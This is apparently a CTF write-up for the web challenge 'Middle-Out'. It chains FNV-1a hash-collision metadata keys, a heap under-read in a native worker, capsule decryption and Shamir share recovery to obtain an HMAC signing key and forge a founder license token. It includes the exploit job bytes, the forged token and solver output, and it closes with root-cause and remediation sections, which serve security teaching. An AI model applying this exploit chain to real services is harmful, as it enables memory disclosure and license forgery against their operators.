# Middle-Out

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Web Exploitation |
| Author | ant1v3n0m |
| Points | 378 |
| Solves at time of solving | 7 |
| Flag | `zdk{TH3_6A7EwaY_and_W0rker_5QuEEZ3d_dLfFeR3NT_MIdD1e5}` |

> Pied Piper has put its middle-out compression service online. Upload a file
> and it returns a proof capsule with the compression result. Gilfoyle says the
> production license is safe. Richard believed him. Prove them wrong.

## Executive Summary

Middle-Out is a browser-to-gateway-to-native-worker challenge. The browser
wraps an uploaded file into a binary `PPJB` job, the JavaScript gateway performs
a preflight validation, and a native worker compresses a window around the
declared center. Founder licenses are signed with a secret that is present in
the worker's memory but is supposed to remain unreachable.

The exploit combines three implementation mismatches:

1. Metadata records carry both a full key and its 32-bit FNV-1a fingerprint.
   The gateway identifies security-sensitive fields by full key string, while
   the native worker dispatches them using only the fingerprint.
2. The gateway permits unknown lowercase extension keys. Lowercase FNV-1a
   collisions for `center` and `radius` therefore survive preflight but become
   those privileged fields in the native worker. Because later fields win, the
   collisions overwrite the already-validated values.
3. The worker checks that `center + radius` does not pass the end of the
   payload, but does not check that `center >= radius`. The colliding values
   `center = 0` and `radius = 1024` pass the upper-bound check for a 1024-byte
   payload and make the worker read 1024 bytes before the payload pointer.

The leaked memory contains four sealed `WSC4` records. An unused browser-WASM
export reveals their format and decryption algorithm. Hex-decoding the public
build ID gives the 8-byte capsule key, and decryption produces four 32-byte
Shamir shares. Two shares are authentic and two are decoys. Interpolating each
pair in `GF(2^8)` and checking the result against the known trial-token HMAC
identifies the authentic pair and recovers the signing key.

Changing the signed claim from `"tier":"trial"` to `"tier":"founder"` then
produces a valid license token. The activation endpoint returns the flag.

```text
malicious PPJB
    |
    v
gateway: exact names -> center=512, radius=256 -> accepted
    |
    v
worker: FNV only -> center=0, radius=1024 -> 1 KiB heap under-read
    |
    v
WSC4 capsules -> build-key decryption -> Shamir shares
    |
    v
HMAC signing key -> forged founder token -> flag
```

The supplied [solver](solve.py) automates this complete chain using only the
Python standard library.

## Repository Contents

| Path | Purpose |
| --- | --- |
| [`solve.py`](solve.py) | End-to-end remote exploit and optional artifact collector |
| [`verify_offline.py`](verify_offline.py) | Replays every cryptographic and binary-format check without a live instance |
| [`artifacts/codec.wasm`](artifacts/codec.wasm) | Browser codec recovered from `/assets/codec.wasm` |
| [`analysis/codec.wat`](analysis/codec.wat) | Full WebAssembly text disassembly |
| [`analysis/codec.decompile.txt`](analysis/codec.decompile.txt) | Readable `wasm-decompile` output, including hidden export `x` |
| [`analysis/protocol-notes.md`](analysis/protocol-notes.md) | Compact PPJB, MOZ1, and WSC4 format reference |
| [`artifacts/malicious-job.ppjb`](artifacts/malicious-job.ppjb) | Exact 1135-byte collision job used by the exploit |
| [`artifacts/decoded-worker-window.bin`](artifacts/decoded-worker-window.bin) | Preserved 2048-byte decompressed worker response |
| [`artifacts/wsc4-shares.json`](artifacts/wsc4-shares.json) | Capsules, decrypted shares, authentic slots, and recovered HMAC key |
| [`artifacts/trial-license.json`](artifacts/trial-license.json) | Trial token and public build ID used as the verification oracle |
| [`artifacts/founder-token.txt`](artifacts/founder-token.txt) | Forged and accepted founder token |
| [`artifacts/activation-response.json`](artifacts/activation-response.json) | Flag-bearing HTTP 200 response |
| [`artifacts/remote-run.txt`](artifacts/remote-run.txt) | Concise transcript of the successful remote exploit |

The original challenge was web-only and did not include a downloadable
handout. All publicly served client code needed for the analysis is represented
by the preserved WASM module and its derived disassemblies.

## 1. Mapping the Application

The landing page exposes one main workflow:

```text
browser codec -> gateway preflight -> native worker -> MOZ1 response
```

The page accepts files from 128 bytes through 4 KiB and a short job label. Its
JavaScript loads `/assets/codec.wasm` and uses four short exports:

| Export | Browser role |
| --- | --- |
| `r()` | Reset the WASM bump allocator |
| `a(size)` | Allocate linear-memory space |
| `w(...)` | Wrap the upload into a `PPJB` job |
| `o(...)` | Verify and decompress a `MOZ1` result |

The page also obtains a trial license:

```http
GET /api/license/trial
```

The captured response was:

```json
{
  "tier": "trial",
  "build": "c3bdbf6cc7b7ef92",
  "token": "eyJ2IjoyLCJ0aWVyIjoidHJpYWwiLCJxdW90YSI6OCwiYnVpbGQiOiJjM2JkYmY2Y2M3YjdlZjkyIn0.KHaO_0svnCxqeS_iL1DZbLhDayf3WM08GWpR8moDQMY",
  "activate": "/api/license/activate"
}
```

The token is a compact two-segment object. Its first segment decodes to:

```json
{
  "v": 2,
  "tier": "trial",
  "quota": 8,
  "build": "c3bdbf6cc7b7ef92"
}
```

The second segment is 32 bytes, consistent with HMAC-SHA256. Submitting this
unchanged token to the advertised endpoint proves the intended goal:

```http
POST /api/license/activate
Content-Type: application/json

{"token":"<trial token>"}
```

```json
{"ok":false,"error":"founder license required"}
```

Malformed signatures instead produce `license signature rejected`. This gives
the final plan: recover the token-signing key and mint a founder token.

## 2. Reversing the PPJB Job Format

The browser's `w` export creates a compact binary job. Reversing
[`codec.wasm`](artifacts/codec.wasm) gives the 16-byte header:

| Offset | Size | Encoding | Meaning |
| ---: | ---: | --- | --- |
| `0x00` | 4 | ASCII | `PPJB` magic |
| `0x04` | 2 | little-endian | version, always `3` |
| `0x06` | 2 | big-endian | metadata length |
| `0x08` | 4 | big-endian | payload length |
| `0x0c` | 4 | big-endian | CRC32C of metadata and payload |

Metadata is a sequence of variable-length TLVs:

```text
+0  u8    key length
+1  u8    value length
+2  be32  FNV-1a fingerprint of the key bytes
+6  bytes key
... bytes value
```

The normal browser profile contains four fields:

| Field | Value |
| --- | --- |
| `label` | Sanitized upload label |
| `center` | `payload_length / 2`, big-endian 16-bit |
| `radius` | `payload_length / 4`, big-endian 16-bit |
| `strategy` | One byte, value `1` |

The checksum is CRC32C/Castagnoli, using reversed polynomial `0x82f63b78`,
not standard ZIP CRC32. Reimplementing this format made it possible to send
jobs that the browser would never generate while retaining valid lengths and
checksums.

## 3. Reversing the MOZ1 Output

Successful compression returns `application/x-middle-out` data beginning with
`MOZ1`. Its 20-byte header stores the radius, decompressed length, packed
length, and standard CRC32.

The stream has two token forms:

- If bit 7 is clear, the low seven bits plus one give a literal length.
- If bit 7 is set, the low seven bits plus three give a repeated-byte length;
  the next byte is the repeated value.

After RLE expansion, output bytes are placed from the midpoint outward:

```text
middle, middle-1, middle+1, middle-2, middle+2, ...
```

This decoder is implemented in `decode_moz1()` in [solve.py](solve.py). It also
verifies the response CRC before treating any bytes as leaked memory.

## 4. The Hidden WASM Export

The JavaScript calls only `r`, `a`, `w`, and `o`, but the module exports one
additional function:

```text
x(capsule_pointer, capsule_length,
  key_pointer, key_length,
  output_pointer, output_capacity)
```

The function accepts exactly 48 capsule bytes, an 8-byte key, and at least 32
bytes of output space. Its validations reveal another format:

```text
+0x00  "WSC4"
+0x04  version = 1
+0x05  share slot
+0x06  payload length = 32
+0x07  method = 1
+0x08  big-endian CRC32 of the 8-byte key
+0x0c  32-byte ciphertext
+0x2c  big-endian CRC32 of bytes 0x00..0x2b
```

For byte index `i`, decryption is:

```python
plaintext[i] = (
    key[(slot + i) & 7]
    ^ ((slot * 29 + 99 + 17 * i) & 0xff)
    ^ ciphertext[i]
)
```

This unused export is a strong hint that WSC4 records exist somewhere in the
worker and that the public build information helps decrypt them.

## 5. Finding the Parser Differential

Gateway experiments showed that the four normal fields are strict singletons:

```text
center is a duplicate singleton field
radius is a duplicate singleton field
strategy is a duplicate singleton field
```

The gateway also validates the normal profile:

```text
center does not match the browser production profile
radius is outside the production range
only the production middle-out strategy is available
```

However, arbitrary lowercase metadata extensions are accepted. For example, a
correctly fingerprinted `foo` field has no effect on the job. Mixed-case and
punctuation-heavy collision keys fail the metadata character policy, so the
collision must use lowercase letters only.

The metadata format itself suggests the mismatch: carrying both the name and
its hash is redundant unless different components rely on different forms.
The gateway uses exact key strings to find the singleton fields. The native
worker instead switches on the supplied, validated 32-bit FNV-1a fingerprint.

Meet-in-the-middle search over eight lowercase letters produced:

```text
FNV1a32("center")   = 0x058c4484
FNV1a32("iqjnabzn") = 0x058c4484

FNV1a32("radius")   = 0x0dba4cb3
FNV1a32("jytlafdd") = 0x0dba4cb3
```

The aliases are distinct ordinary extension keys to the gateway, but privileged
fields to the worker. Placing each alias after the canonical field demonstrates
that the worker uses last-write-wins parsing.

For example, appending `iqjnabzn = 1` to a valid 128-byte profile changed the
worker's selected center and returned bytes from before the payload. Reversing
the field order restored normal output, confirming the overwrite direction.

## 6. Converting the Collision into an Under-Read

The largest browser profile accepted by the production gateway used a
1024-byte payload:

```text
canonical center = 512
canonical radius = 256
```

Those values pass every gateway check. The malicious job then appends:

```text
iqjnabzn = 0       # native center
jytlafdd = 1024    # native radius
```

The worker's upper-bound condition still succeeds:

```text
center + radius <= payload_length
0      + 1024   <= 1024
```

But the start of the window is invalid:

```text
center - radius = 0 - 1024 = -1024
```

The missing `center >= radius` check therefore selects the range:

```text
[payload_pointer - 1024, payload_pointer + 1024)
```

The response decompresses to 2048 bytes. Its first half is native-worker memory
preceding the payload, and its second half is the controlled `A` payload.

The beginning of the exact job is visible with:

```console
$ xxd -g1 -l 112 artifacts/malicious-job.ppjb
00000000: 50 50 4a 42 03 00 00 5f 00 00 04 00 6a 56 ee ac  PPJB..._....jV..
00000010: 05 09 f6 97 17 fd 6c 61 62 65 6c 62 65 6e 63 68  ......labelbench
00000020: 6d 61 72 6b 06 02 05 8c 44 84 63 65 6e 74 65 72  mark....D.center
00000030: 02 00 06 02 0d ba 4c b3 72 61 64 69 75 73 01 00  ......L.radius..
00000040: 08 01 96 87 87 24 73 74 72 61 74 65 67 79 01 08  .....$strategy..
00000050: 02 05 8c 44 84 69 71 6a 6e 61 62 7a 6e 00 00 08  ...D.iqjnabzn...
00000060: 02 0d ba 4c b3 6a 79 74 6c 61 66 64 64 04 00 41  ...L.jytlafdd..A
```

## 7. Extracting and Decrypting WSC4 Shares

Scanning the first 1024 leaked bytes for `WSC4` finds four records with slots:

```text
123, 148, 209, 236
```

Every record passes its outer CRC32 and commits to the same key CRC:

```text
key CRC32 = 0x8b9ba950
```

The trial response provides a 16-character hexadecimal build ID. Interpreting
it as eight raw bytes gives an exact match:

```text
build ID             c3bdbf6cc7b7ef92
decoded build key    c3 bd bf 6c c7 b7 ef 92
CRC32(build key)     8b 9b a9 50
```

Applying the hidden `x` algorithm yields four 32-byte values:

| Slot | Decrypted share |
| ---: | --- |
| 123 | `9af22d13341cfecc68ecb60df118c53a79fff47d7fb023b174a2dd27b7722746` |
| 148 | `c8d6a14daf13571aea8d4bd17dca2f970db44f3a3c200b05c5d20021e091ce2d` |
| 209 | `50ee014058b37f09ba21b7a23490e704680650747d039b6611cebbffa9055995` |
| 236 | `777f0b9162f29220fd0bd86e49dad8dd427310a381a0368ae8d4e83b41914023` |

The slot byte acts as the Shamir x-coordinate, and the 32 decrypted bytes are
the y-coordinate for 32 parallel degree-one polynomials over `GF(2^8)`. The
field uses the AES reduction polynomial `0x11b`.

## 8. Identifying the Authentic Shares

Only two records belong to the real 2-of-n secret; the others are decoys. The
public trial token gives a perfect oracle for selecting the authentic pair.

For shares `(x1, y1)` and `(x2, y2)`, interpolation at zero is:

```text
secret = y1 * x2 / (x1 + x2) + y2 * x1 / (x1 + x2)
```

Addition and subtraction are both XOR in characteristic two. The solver tries
all six pairs and checks:

```python
HMAC_SHA256(candidate_secret, trial_payload_segment) == trial_signature
```

Only slots `209` and `123` match. They reconstruct:

```text
daa6e9b12b7c54a160b9b16d9c8d2b800e26a542718426a254bdf419ed2c4649
```

This validates the full chain offline: correct memory records, correct WSC4
decryption, correct finite field, correct shares, and correct signing key.

## 9. Forging a Founder License

The original trial claims are preserved exactly except for the tier:

```json
{
  "v": 2,
  "tier": "founder",
  "quota": 8,
  "build": "c3bdbf6cc7b7ef92"
}
```

Compact JSON is base64url-encoded without padding and signed with the recovered
HMAC-SHA256 key. The resulting token is:

```text
eyJ2IjoyLCJ0aWVyIjoiZm91bmRlciIsInF1b3RhIjo4LCJidWlsZCI6ImMzYmRiZjZjYzdiN2VmOTIifQ.deLZ7K37xmWf7MP4ewrsjUSPQQu8bskgWWS32qPhCgw
```

Activation succeeds:

```http
POST /api/license/activate
Content-Type: application/json

{"token":"eyJ2IjoyLCJ0aWVyIjoiZm91bmRlciIsInF1b3RhIjo4LCJidWlsZCI6ImMzYmRiZjZjYzdiN2VmOTIifQ.deLZ7K37xmWf7MP4ewrsjUSPQQu8bskgWWS32qPhCgw"}
```

```http
HTTP/2 200
Content-Type: application/json

{"ok":true,"tier":"founder","license":"zdk{TH3_6A7EwaY_and_W0rker_5QuEEZ3d_dLfFeR3NT_MIdD1e5}"}
```

## 10. Running the Solver

For a live challenge instance:

```console
$ python3 solve.py https://middle-out-INSTANCE.chals.z0d1ak.org
[+] build ID: c3bdbf6cc7b7ef92
[+] FNV(center)  = FNV(iqjnabzn) = 0x058c4484
[+] FNV(radius)  = FNV(jytlafdd) = 0x0dba4cb3
[+] leak attempt 1: 2048 bytes, 4 valid WSC4 capsules
[+] authentic Shamir shares: slots 209 and 123
[+] recovered HMAC-SHA256 key: daa6e9b12b7c54a160b9b16d9c8d2b800e26a542718426a254bdf419ed2c4649
[+] founder activation accepted: founder
zdk{TH3_6A7EwaY_and_W0rker_5QuEEZ3d_dLfFeR3NT_MIdD1e5}
```

Passing `--artifacts-dir DIR` also records the malicious job, compressed worker
response, decoded memory window, capsule shares, trial license, and activation
response from that run.

The original instance expired after the successful solve. The complete
preserved chain can still be checked locally:

```console
$ python3 verify_offline.py
[+] PPJB structure, CRC32C, and both FNV-1a collisions verified
[+] validated and decrypted WSC4 slots: [123, 148, 209, 236]
[+] Shamir slots (123, 209) reconstruct the captured token's HMAC key
[+] founder token and captured successful activation response verified
zdk{TH3_6A7EwaY_and_W0rker_5QuEEZ3d_dLfFeR3NT_MIdD1e5}
```

## Root Cause

The fundamental issue is inconsistent interpretation across a trust boundary.
The gateway and worker do not share one canonical metadata parser:

- The gateway authorizes fields by full string name.
- The worker resolves fields by a collision-prone, attacker-supplied 32-bit
  fingerprint and accepts last-write-wins overwrites.
- Worker bounds validation checks only the end of the selected range, not its
  beginning.
- Sensitive license material is resident immediately before attacker-controlled
  payload storage.

Each choice amplifies the next. The hash collision bypasses semantic validation,
the asymmetric bounds check turns that bypass into disclosure, and the memory
layout turns disclosure into license-signing authority.

## Remediation

The service should use a single shared parser and pass already-canonicalized
values to the worker. In particular:

1. Resolve metadata by exact key bytes, never by a 32-bit fingerprint alone.
2. Recompute fingerprints internally if they are retained for indexing, and
   confirm the full key after a hash match.
3. Reject unknown metadata fields or define an explicit namespaced extension
   mechanism that cannot collide with privileged fields.
4. Reject duplicate semantic fields after canonicalization.
5. Validate both `center >= radius` and `center + radius <= payload_length`
   using overflow-safe arithmetic.
6. Keep production credentials out of compression-worker address space and
   isolate per-request payload buffers from long-lived secrets.

The flag is:

```text
zdk{TH3_6A7EwaY_and_W0rker_5QuEEZ3d_dLfFeR3NT_MIdD1e5}
```
